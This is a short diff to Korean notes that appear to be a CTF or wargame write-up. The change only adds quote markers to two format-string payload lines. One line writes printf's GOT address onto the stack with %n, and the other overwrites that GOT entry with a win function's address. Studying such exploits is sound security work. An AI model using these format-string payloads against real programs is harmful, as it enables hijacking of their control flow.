@@ -39,9 +39,9 @@ gdb-peda$ x/100wx $esp
 
 1. fsb를 이용하여 stack안의 적당한 포인터인 0xffffcfb0의 자리에 printf의 got로 값 modify
 
-%8x %8x %8x %8x %8x %8x %8x %134520780x %n : 0xffffcfb0의 값을 0x804a00c(printf의 got)으로 변경
+> %8x %8x %8x %8x %8x %8x %8x %134520780x %n : 0xffffcfb0의 값을 0x804a00c(printf의 got)으로 변경
 
 2. double stage fsb를 이용하여 printf함수의 got를 win함수의 주소로 덮어서 익스
 
-%8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %134514150x %n : printf의 got를 0x080485bd(win함수의 주소)로 변경
+> %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %134514150x %n : printf의 got를 0x080485bd(win함수의 주소)로 변경
 
